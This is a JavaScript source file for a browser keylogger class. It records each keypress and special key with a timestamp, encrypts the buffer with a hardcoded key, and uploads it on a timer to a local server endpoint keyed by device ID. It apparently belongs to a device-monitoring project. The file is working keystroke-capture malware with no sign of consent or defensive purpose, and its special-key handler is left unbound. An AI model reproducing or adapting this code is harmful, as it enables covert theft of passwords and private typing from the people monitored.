class KeyLogger {
    constructor() {
        this.deviceId = null;
        this.isLogging = false;
        this.buffer = [];
        this.bufferInterval = null;
        this.encryption = new EncryptionUtil('default_key');
        
        // Bind methods
        this.handleKeyPress = this.handleKeyPress.bind(this);
        this.flushBuffer = this.flushBuffer.bind(this);
    }

    async start(deviceId) {
        if (this.isLogging) return;
        
        try {
            const response = await fetch('http://localhost:5001/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId })
            });

            if (response.ok) {
                this.deviceId = deviceId;
                this.isLogging = true;
                
                // Start buffer flush interval
                this.bufferInterval = setInterval(this.flushBuffer, 5000);
                
                // Start key logging
                document.addEventListener('keypress', this.handleKeyPress);
                document.addEventListener('keydown', this.handleSpecialKeys);
                
                console.log('Keylogger started');
                return true;
            } else {
                throw new Error('Failed to start keylogger');
            }
        } catch (error) {
            console.error('Error starting keylogger:', error);
            return false;
        }
    }

    async stop() {
        if (!this.isLogging) return;
        
        try {
            const response = await fetch('http://localhost:5001/stop', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: this.deviceId })
            });

            if (response.ok) {
                // Final flush
                await this.flushBuffer();
                
                // Clean up
                this.isLogging = false;
                document.removeEventListener('keypress', this.handleKeyPress);
                document.removeEventListener('keydown', this.handleSpecialKeys);
                clearInterval(this.bufferInterval);
                
                console.log('Keylogger stopped');
                return true;
            } else {
                throw new Error('Failed to stop keylogger');
            }
        } catch (error) {
            console.error('Error stopping keylogger:', error);
            return false;
        }
    }

    handleKeyPress(event) {
        if (!this.isLogging) return;
        
        const key = event.key;
        const timestamp = new Date().toISOString();
        
        this.buffer.push({
            key,
            timestamp,
            type: 'keypress'
        });
        
        // Flush if buffer gets too large
        if (this.buffer.length >= 50) {
            this.flushBuffer();
        }
    }

    handleSpecialKeys(event) {
        if (!this.isLogging) return;
        
        // Only handle special keys
        const specialKeys = ['Enter', 'Backspace', 'Tab', 'Escape', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
        if (!specialKeys.includes(event.key)) return;
        
        const timestamp = new Date().toISOString();
        
        this.buffer.push({
            key: `[${event.key}]`,
            timestamp,
            type: 'special'
        });
    }

    async flushBuffer() {
        if (!this.buffer.length || !this.isLogging) return;
        
        try {
            // Encrypt the buffer before sending
            const encryptedData = await this.encryption.encrypt(JSON.stringify(this.buffer));
            
            const response = await fetch('http://localhost:5001/logs/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    deviceId: this.deviceId,
                    data: encryptedData,
                    timestamp: new Date().toISOString()
                })
            });

            if (response.ok) {
                // Clear buffer after successful upload
                this.buffer = [];
                
                // Notify device manager to update
                if (window.deviceManager) {
                    window.deviceManager.updateDevices();
                }
            } else {
                throw new Error('Failed to upload logs');
            }
        } catch (error) {
            console.error('Error flushing buffer:', error);
        }
    }
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.keyLogger = new KeyLogger();
});